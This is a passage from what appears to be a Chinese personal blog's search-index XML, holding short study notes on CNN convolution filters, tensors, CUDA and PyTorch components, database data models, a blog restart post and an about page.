target="_blank" rel="noopener">图片来源</a></p><p>蓝色是输入 channel，绿色是输出 channel，中间的不断滑动的四条直线表示 3x3 的 convolutional filter。</p><p>可以看到，输入 channel 到输出 channel 的元素数量没变，只是都经过 flter 处理了一下</p><h4 id="卷积运算-Convolution-operaton"><a href="#卷积运算-Convolution-operaton" class="headerlink" title="卷积运算 Convolution operaton"></a>卷积运算 Convolution operaton</h4><p>滑动操作就是卷，准确地说，这个 filter 正在把输入的每个 3x3 的块进行卷积。</p><p>蓝色输入 channel 是来自 MNIST 数据集的图像的矩阵表示。<br>该矩阵中的值是图像中的各个像素。<br>这些图像是灰度图像，每个像素可以用 0-255 中一个整数值表示，因此我们只有一个输入 channel。</p><p>RGB 图像有 3 个颜色通道。</p><p>我们将 filter 与前 3 x 3 像素块点积（按元素乘积的总和。或者说 Frobenius Inner product 或 Hadamard product 的和），然后将结果存储在输出 channel 中。<br>然后，change 滑动到下一个 3 x 3 块，计算点积，并将该值存储为输出 channel 中的下一个像素。</p><p>整个输出 channel 称为 feature map。</p><p>这只是一个非常简单的示例，但是正如前面提到的，我们可以将这些 filters 视为模式发现器。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>一个 MNIST 的图片</p><p><img src="/images/image-20200130204856727.png" alt="7"></p><p>假设我们的卷积层有 4 个 filter，这些值可以通过使 - 1 对应于黑色，1 对应于白色，0 对应于灰色来直观地表示。</p><p><img src="/images/image-20200130205238234.png" alt="4 个 filter"></p><p>如果我们将原始的七个图像分别与这四个 filter 中的每个进行卷积，则每个 filter 的输出如下所示：</p><p><img src="/images/image-20200130205348537.png" alt="output"></p><p>我们可以看到所有这四个 filter 都在检测（detect）边缘。<br>在输出通道中，最亮的像素可以解释为 filter 检测到的结果像素。</p><p>第一个中，我们可以看到数 7 的顶部的水平边缘，并以最亮的像素（白色）表示。</p><p>第二个检测左垂直边缘，再次以最亮的像素显示。</p><p>第三个检测底部水平边缘.</p><p>第四个检测右侧垂直边缘。</p><p>这些是我们在卷积神经网络开始时可能会看到的过滤器。<br>更复杂的过滤器将位于网络的更深处，并将逐渐能够检测到更复杂的模式，如下所示：</p><p><img src="/images/image-20200130205757413.png" alt="更复杂的 filter"></p><p>还有更更复杂的</p><p><img src="/images/image-20200130205917408.png" alt="检测狗脸"></p><p>最神奇的是这些 pattern filter 是通过网络自动导出的</p><p> filter 的值以随机值开始，并且随着网络在训练期间学习而改变。<br> filter 的模式检测功能会自动出现。</p><p>过去，计算机视觉专家会手动开发 filter（模式检测器）。<br>一个示例是边缘检测器 Sobel filter。</p><h4 id="但是，通过深度学习，我们可以使用神经网络自动学习这些过滤器！"><a href="#但是，通过深度学习，我们可以使用神经网络自动学习这些过滤器！" class="headerlink" title="但是，通过深度学习，我们可以使用神经网络自动学习这些过滤器！"></a>但是，通过深度学习，我们可以使用神经网络自动学习这些过滤器！</h4><p>总结自 <a href="https://deeplizard.com/learn/video/YRhxdVk_sIs" target="_blank" rel="noopener">https://deeplizard.com/learn/video/YRhxdVk_sIs</a></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解释张量</title>
      <link href="2020/01/30/%E8%A7%A3%E9%87%8A%E5%BC%A0%E9%87%8F/"/>
      <url>2020/01/30/%E8%A7%A3%E9%87%8A%E5%BC%A0%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="张量是神经网络里的主要数据结构。"><a href="#张量是神经网络里的主要数据结构。" class="headerlink" title="张量是神经网络里的主要数据结构。"></a>张量是神经网络里的主要数据结构。</h1><p>数学上的标量，向量，矩阵，现在使用 <code>nd-tensor</code> 表示</p><p>CS 里的 number，数组，二维数组，现在使用 <code>nd-array</code> 表示</p><p>上面的 <code>n</code> 表示，确定一个特定的一个元素需要 <code>n</code> 个索引</p><p>tensor 和 array，它们只是叫法不一样。</p><p>这里的 n 不是我们数学课狭义的维度。</p><p>因为：</p><blockquote><p>关于张量的维数要注意的一件事是，它与我们在向量空间中引用向量的维数时的含义不同。张量的维数不能告诉我们张量中存在多少个分量。</p></blockquote><blockquote><p>如果我们有一个来自三维欧几里德空间的三维向量，那么我们将得到一个具有三个分量的有序三元组。</p></blockquote><p>但是，三维张量可以具有三个以上的分量。<br>例如，我们的二维张量 dd 有 9 个分量。</p><pre><code class="python">dd = [[1,2,3],[4,5,6],[7,8,9]]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CUDA 简介</title>
      <link href="2020/01/29/CUDA%E7%AE%80%E4%BB%8B/"/>
      <url>2020/01/29/CUDA%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>GPU 适合某些情景下的并行运算，因为计算核心比 CPU 多。</p><p>这些场景一般可以将计算过程分为互不依赖的更小的子过程进行并行处理，称为 <code>embarrassingly parallel</code></p><img src="/images/image-20200129215610473.png" alt="image-20200129215610473" style="zoom:50%;" /><p>Torch 创始人大佬就说</p><blockquote><p>神经网络是 embarrassingly parallel</p></blockquote><p>张量由 CPU 计算转 GPU 计算</p><pre><code class="python">t = torch.tensor([1, 2, 3])# 使用 CUDAt = cuda()</code></pre><img src="/images/image-20200129215811882.png" alt="image-20200129215811882" style="zoom:50%;" /><p>红框表示你可以使用多个显卡，当前使用显卡 0</p>]]></content>
      
      
      <categories>
          
          <category> 视频笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pytorch 组成介绍</title>
      <link href="2020/01/29/Pytorch%E7%BB%84%E6%88%90%E4%BB%8B%E7%BB%8D/"/>
      <url>2020/01/29/Pytorch%E7%BB%84%E6%88%90%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>先知道以下 Torch 创始人大佬 Soumith Chintala</p><p>主要组件</p><ul><li>*<em>torch  张量库 *</em></li><li>torch.nn 包含用来构建神经网络的类</li><li>*<em>torch.autograd 张量微分操作 *</em></li><li>torch.nn.functional 例如损失函数，激活函数</li><li>torch.optim 包含标准优化操作，如 SGD 和 ADam</li><li>torch.utils 数据集和数据加载器</li><li>torchvision 计算机视觉相关</li></ul>]]></content>
      
      
      <categories>
          
          <category> 视频笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据模型</title>
      <link href="2019/12/13/%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B/"/>
      <url>2019/12/13/%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="数据模型的分类"><a href="#数据模型的分类" class="headerlink" title="数据模型的分类"></a>数据模型的分类</h2><h3 id="概念模型"><a href="#概念模型" class="headerlink" title="概念模型"></a>概念模型</h3><p>主要用于数据库设计，以用户观点对数据建模。</p><p>是现实世界到信息世界的第一层抽象。</p><ul><li>实体，如一个学生，一门课。</li><li>属性，学生学号，姓名，性别，课程名。</li><li>码，唯一标识实体的属性集，如学号是学生实体的码。</li><li>实体型，用实体名和属性名集合来抽象和刻画同一实体，如学生（学号，姓名，性别）</li><li>实体集，如全体学生</li><li>联系，不同实体之间的联系。</li></ul><p>** 表示方法 E-R 图 **</p><h3 id="逻辑模型和物理模型"><a href="#逻辑模型和物理模型" class="headerlink" title="逻辑模型和物理模型"></a>逻辑模型和物理模型</h3><p>逻辑模型包括</p><ul><li>层次模型，</li><li>网状模型，</li><li>关系模型，</li><li>面向对象数据模型，</li><li>对象关系数据模型，</li><li>半结构化数据模型。</li></ul><p>逻辑模型是以计算机系统观点对数据建模。</p><p>物理模型是对数据最底层的抽象</p><h2 id="数据模型组成要素"><a href="#数据模型组成要素" class="headerlink" title="数据模型组成要素"></a>数据模型组成要素</h2><ul><li>数据结构，描述数据库的组成对象以及对象之间的联系</li><li>数据操作，查询，更新（包括插入，删除，修改）</li><li>数据的完整性约束条件</li></ul><h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><p>关系模型数据结构是一张规范化的 ** 二维表 **。</p><ul><li>关系：一个关系对应通常说的一张表</li><li>元组：表的一行</li><li>属性（字段）：表中的一列</li><li>码（码键）：它可以唯一确定一个元组</li><li>域：属性的取值范围</li><li>分量：元组中某一个属性值，不可再分</li><li>关系模式：一般为 <code>关系名（属性 1，属性 2，属性 3，。。。）</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重启</title>
      <link href="2019/12/08/%E9%87%8D%E5%90%AF/"/>
      <url>2019/12/08/%E9%87%8D%E5%90%AF/</url>
      
        <content type="html"><![CDATA[<p>一年多没写了，重启！！！希望这次能坚持下去🤣<br>PS：虽然上了这破 P 研究生屁事很多，但是人要有信念啊😊</p><p>以前的内容就不在这里放了😏</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="2019/01/25/me/"/>
      <url>2019/01/25/me/</url>
      
        <content type="html"><![CDATA[<blockquote><p>欢迎来到我的小站呀，很高兴遇见你！🤝</p></blockquote><h1 id="关于此博客"><a href="#关于此博客" class="headerlink" title="关于此博客"></a>关于此博客</h1><p>此博客使用文章 <a href="https://gridea.dev/" target="_blank" rel="noopener">Gridea</a>+markdown 编写，在本地渲染后，只需上传静态文件到 HTTP 服务器（本站用的 nginx）。<br>博客主题使用的是 Gridea 的作者的付费主题（用到了 Vue+ejs+tailwind）。我在此主题中添加了搜索功能，修改了一些配色。</p><h1 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h1><ul><li>兴趣爱好：** 玩游戏 &amp; 写 Bug**</li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
